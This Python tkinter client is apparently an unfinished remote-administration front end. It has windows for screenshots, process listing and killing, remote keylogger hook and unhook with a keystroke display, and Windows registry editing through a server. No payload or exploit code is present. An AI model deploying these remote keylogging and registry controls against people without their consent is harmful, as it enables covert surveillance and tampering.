import Client

import pyautogui
import tkinter as tk
import tkinter.ttk as ttk

from PIL import Image, ImageTk
from tkinter import filedialog


class FunctionWindow(Client.ClientApp):
    def __init__(self, top_level_window):
        self.window = tk.Toplevel(top_level_window)
    
    def run(self):
        self.window.mainloop()

class ScreenshotWindow(FunctionWindow):
    def __init__(self, top_level_window):
        super().__init__(top_level_window)

        # Focus
        self.window.grab_set()
        self.window.title('Sreenshot')

        self.btn_frame = tk.Frame(
            master=self.window
        )

        # Buttons
        self.btn_take_screenshot = tk.Button(
            master=self.btn_frame,
            text='Take screenshot',
            command=self.take_screenshot_command
        )

        self.btn_show_screenshot = tk.Button(
            master=self.btn_frame,
            text='Show screenshot',
            command=self.show_screenshot_command
        )

        self.btn_save_screenshot = tk.Button(
            master=self.btn_frame,
            text='Save screenshot',
            command=self.save_screenshot_command
        )

        self.btn_delete_screenshot = tk.Button(
            master=self.btn_frame,
            text='Delete',
            command=self.delete_screenshot_command
        )

        # Canvas for showing screenshot
        self.canvas = tk.Canvas(master=self.window)
        
        self.btn_frame.pack()
        
        self.btn_take_screenshot.pack(side='left')
        self.btn_show_screenshot.pack(side='left')
        self.btn_save_screenshot.pack(side='left')
        self.btn_delete_screenshot.pack()

        self.btn_show_screenshot.configure(state='disabled')
        self.btn_save_screenshot.configure(state='disabled')
        self.btn_delete_screenshot.configure(state='disabled')
        self.canvas.pack()

    def take_screenshot_command(self):
        self.img = pyautogui.screenshot()
        self.btn_show_screenshot.configure(state='active')
        self.btn_save_screenshot.configure(state='active')
        self.btn_delete_screenshot.configure(state='active')

    def show_screenshot_command(self):
        self.image_tk = ImageTk.PhotoImage(self.img)
        self.canvas.create_image(0, 0, anchor=tk.NW, image=self.image_tk)

    def save_screenshot_command(self):
        path = filedialog.asksaveasfilename(
            defaultextension='.jpg',
            filetypes=[('PNG files', '*.png'), ('JPG files', '*.jpg'), ('All files', '*.*')]
        )
        self.img.save(path)

    def delete_screenshot_command(self):
        self.canvas.delete('all')
        self.btn_show_screenshot.configure(state='disabled')
        self.btn_save_screenshot.configure(state='disabled')
        self.btn_delete_screenshot.configure(state='disabled')

class ProcessWindow(FunctionWindow):
    def __init__(self, top_level_window):
        super().__init__(top_level_window)

        # Button frame
        self.frame_get = tk.Frame(
            master=self.window
        )

        # Button for getting processes
        self.btn_get_process = tk.Button(
            master=self.frame_get,
            text='Get',
            command=self.get_process_command
        )
        self.btn_get_process.pack()

        # Container frame for table
        self.frame_table = tk.Frame(
            master=self.window,
        )

        # Table of running processes
        self.table_process = ttk.Treeview(
            master=self.frame_table,
            columns=('ID', 'Name', 'Count Thread')
        )

        self.table_process.heading('#0', text='Index')
        self.table_process.heading('#1', text='ID')
        self.table_process.heading('#2', text='Name')
        self.table_process.heading('#3', text='Count Thread')

        self.table_process.column('#0', stretch=tk.YES)
        self.table_process.column('#1', stretch=tk.YES)
        self.table_process.column('#2', stretch=tk.YES)
        self.table_process.column('#3', stretch=tk.YES)
        self.table_process.pack(side='left')
        self.table_process_iid = -1 # Pointer for the table
        
        # Table scrollbar
        self.table_process_scrollbar = ttk.Scrollbar(
            master=self.frame_table,
            orient='vertical',
            command=self.table_process.yview
        )
        self.table_process_scrollbar.pack(side='right', fill='y')

        # Frame for start and kill functions
        self.frame_start_kill = tk.Frame(
            master=self.window,
        )

        # self.label_process_id = tk.Label(
        #     master=self.frame_start_kill,
        #     text='Process ID'
        # )

        # self.entry_process_id = tk.Entry(
        #     master=self.frame_start_kill,
        #     text='Enter process ID'
        # )

        self.btn_start_process = tk.Button(
            master=self.frame_start_kill,
            text='Start',
            command=self.start_process_command
        )
        self.btn_start_process.pack()

        self.btn_kill_process = tk.Button(
            master=self.frame_start_kill,
            text='Kill'
        )
        self.btn_kill_process.pack()

        self.frame_get.pack()
        self.frame_table.pack()
        self.frame_start_kill.pack()

    def table_clear_all(self):
        while self.table_process_iid >= 0:
            self.table_process.delete(self.table_process_iid)
            self.table_process_iid -= 1

    def get_process_command(self):
        self.request('process', 'list', '')
        (error_code, error_message, server_data) = self.receive_reply()
        
        self.table_clear_all()
        if error_code == 0:
            for line in server_data.splitlines():
                self.table_process_iid += 1
                t = tuple(line.split(','))
                self.table_process.insert(
                    parent='',
                    index='end',
                    iid=self.table_process_iid,
                    text=str(self.table_process_iid + 1),
                    values=t
                )
        else:
            tk.messagebox.showwarning('Error', error_message)

    def start_process_command(self):
        self.entry_start_process = tk.Entry(
            #master=
        )

        # process_name = self.entry_start_process.get()
        process_name = 'abc'

        self.request('process', 'start', process_name)
        (error_code, error_message, server_data) = self.receive_reply()
        if error_code == 0:
            tk.messagebox.showinfo('Start process', f'Start {process_name} successfully')
        else:
            tk.messagebox.showwarning('Error', error_message)

    def kill_process_command(self):
        # TODO: Create a new window, request user for process ID input
        self.entry_kill_process = tk.Entry(
            # master=
        )
        process_id = self.entry_kill_process.get()

        self.request('process', 'kill', process_id)
        (error_code, error_message, server_data) = self.receive_reply()

        if error_code == 0:
            tk.messagebox.showinfo('Kill process', f'Kill process ID {process_id} successfully')
        else:
            tk.messagebox.showwarning('Error', error_message)

class KeyloggerWindow(FunctionWindow):
    def __init__(self, top_level_window):
        super().__init__(top_level_window)

        # Frame for buttons
        self.frame_button = tk.Frame(
            master=self.window,
        )

        self.btn_hook = tk.Button(
            master=self.frame_button,
            text='Hook',
            command=self.hook_command
        )
        self.btn_hook.pack()

        self.btn_unhook = tk.Button(
            master=self.frame_button,
            text='Unhook',
            state='disabled',
            command=self.unhook_command
        )
        self.btn_unhook.pack()

        self.btn_print = tk.Button(
            master=self.frame_button,
            text='Print',
            state='disabled',
            command=self.print_command
        )
        self.btn_print.pack()

        self.btn_delete = tk.Button(
            master=self.frame_button,
            text='Delete',
            state='disabled',
            command=self.delete_command
        )
        self.btn_delete.pack()

        self.text = tk.Text(
            master=self.window,
            padx=5,
            pady=5,
            state='disabled' # No text entry
        )

        self.frame_button.pack()
        self.text.pack()

        # A stream holding keystrokes hooked
        self.keystroke_stream = ''

    def hook_command(self):
        self.request('keylogging', 'hook', '')
        (error_code, error_message, server_data) = self.receive_reply()
        
        if error_code == 0:
            self.keystroke_stream += server_data
            self.btn_hook.configure(state='disabled')
            self.btn_unhook.configure(state='active')
        else:
            tk.messagebox.showwarning('Error', error_message)

    def unhook_command(self):
        self.request('keylogging', 'unhook', '')
        (error_code, error_message, server_data) = self.receive_reply()

        if error_code == 0:
            self.btn_hook.configure(state='active')
            self.btn_print.configure(state='active')
            self.btn_delete.configure(state='active')
        else:
            tk.messagebox.showwarning('Error', error_message)

    def print_command(self):
        self.text.configure(state='normal')
        self.text.insert(1.0, self.keystroke_stream)
        self.text.configure(state='disabled')

    def delete_command(self):
        self.text.configure(state='normal')
        self.text.delete(1.0, tk.END)
        self.text.configure(state='disabled')

        self.btn_unhook.configure(state='disabled')
        self.btn_print.configure(state='disabled')
        self.btn_delete.configure(state='disabled')
        self.keystroke_stream = ''

class RegistryWindow(FunctionWindow):
    def __init__(self, top_level_window):
        super().__init__(top_level_window)

        self.window.grab_set()
        self.window.title('Registry')

        self.window.rowconfigure(0, weight=1, minsize=75)
        self.window.rowconfigure(1, weight=1, minsize=75)
        self.window.rowconfigure(2, weight=1, minsize=10)
        self.window.columnconfigure(0, weight=1, minsize=50)

        self.initialize_frame1()
        self.initialize_frame2()
        self.initialize_frame3()

        self.frame1.grid(row=0, column=0, padx=5, pady=5, sticky='nsew')
        self.frame2.grid(row=1, column=0, padx=5, pady=5, sticky='nsew')
        self.frame3.grid(row=2, column=0, padx=5, pady=5, sticky='nsew')

    def initialize_frame1(self):
        # Frame containing buttons and entries for sending registry files
        self.frame1 = tk.Frame(
            master=self.window,
            relief=tk.GROOVE,
            borderwidth=1    
        )

        for i in range(2):
            for j in range(2):
                self.frame1.rowconfigure(i, weight=1, minsize=20)
                self.frame1.columnconfigure(j, weight=1)

        self.entry_browse_registry_file = tk.Entry(
            master=self.frame1
        )
        self.entry_browse_registry_file.grid(row=0, column=0, padx=5, pady=5, sticky='nsew')

        self.btn_browse = tk.Button(
            master=self.frame1,
            text='Browse',
            command=self.command_browse,
        )
        self.btn_browse.grid(row=0, column=1, padx=5, pady=5, sticky='nsew')

        self.text_registry_file_content = tk.Text(
            master=self.frame1,
            height=5,
            width=50
        )
        self.text_registry_file_content.grid(row=1, column=0, padx=5, pady=5, sticky='nsew')

        self.btn_send_registry_file = tk.Button(
            master = self.frame1,
            text='Send',
            height=10
            # command
        )
        self.btn_send_registry_file.grid(row=1, column=1, padx=5, pady=5, sticky='nsew')

    def initialize_frame2(self):
        # Frame containing buttons, entries, and dropboxes for modifying registry keys directly
        self.frame2 = tk.Frame(
            master=self.window,
            relief=tk.GROOVE,
            borderwidth=1
        )

        self.OPTION_FUNCTIONS = [
            'Get value',
            'Set value',
            'Delete value',
            'Create key',
            'Delete key'
        ]

        self.variable = tk.StringVar(self.window)
        self.variable.set('Select an option')

        self.menu_function = ttk.Combobox(
            master=self.frame2,
            textvariable=self.variable,
            # *self.OPTION_FUNCTIONS,
            # command=self.frame2_alternate_widgets
        )
        self.menu_function['values'] = self.OPTION_FUNCTIONS
        self.menu_function.bind('<<ComboboxSelected>>', self.frame2_alternate_widgets)
        self.menu_function.pack(fill=tk.X, padx=5, pady=5)

        self.entry1 = tk.Entry(
            master=self.frame2
        )
        self.entry1.pack(fill=tk.X, padx=5, pady=5, expand=True)
        
        self.frame_wrapper = tk.Frame(
            master=self.frame2
        )

        self.entry2 = tk.Entry(
            master=self.frame_wrapper
        )
        self.entry2.pack(side=tk.LEFT, fill=tk.X, padx=5, pady=5, expand=True)
        
        self.entry3 = tk.Entry(
            master=self.frame_wrapper
        )
        self.entry3.pack(side=tk.LEFT, fill=tk.X, padx=5, pady=5, expand=True)

        self.OPTION_KEYTYPES = [
            'String',
            'Binary',
            'DWORD',
            'QWORD',
            'Multi-String',
            'Expandable String'
        ]

        self.variable_keytype = tk.StringVar(self.window)
        self.variable_keytype.set('Data type')

        self.menu_keytype = ttk.Combobox(
            master=self.frame_wrapper,
            textvariable=self.variable_keytype,
        )
        self.menu_keytype['values'] = self.OPTION_KEYTYPES
        self.menu_keytype.pack(side=tk.LEFT, fill=tk.X, padx=5, pady=5, expand=True)

        self.frame_wrapper.pack(fill=tk.X, expand=True)

    def initialize_frame3(self):
        self.frame3 = tk.Frame(
            master=self.window,
            relief=tk.GROOVE,
            borderwidth=1
        )

        self.btn_send = tk.Button(
            master=self.frame3,
            text='Send',
            width=10
        )
        self.btn_send.pack(side=tk.LEFT, padx=5, pady=5)

        self.btn_delete = tk.Button(
            master=self.frame3,
            text='Delete',
            width=10
        )
        self.btn_delete.pack(side=tk.LEFT, padx=5, pady=5)

    def frame2_alternate_widgets(self, event):
        if self.variable.get() in {'Get value', 'Delete value'}:
            self.entry3.pack_forget()
            self.menu_keytype.pack_forget()
        elif self.variable.get() in {'Create key', 'Delete key'}:
            self.frame_wrapper.pack_forget()    
        else:
            self.entry3.pack()
            self.menu_keytype.pack()
            self.frame_wrapper.pack()

    def command_browse(self):
        path = filedialog.askopenfilename(
            title='Select registry file',
            filetypes=(('reg files', '*.reg'), ('All files', '*.*'))
        )
        content = open(path).read()
        self.entry_browse_registry_file.insert(0, path)
        self.text_registry_file_content.insert('1.0', content)
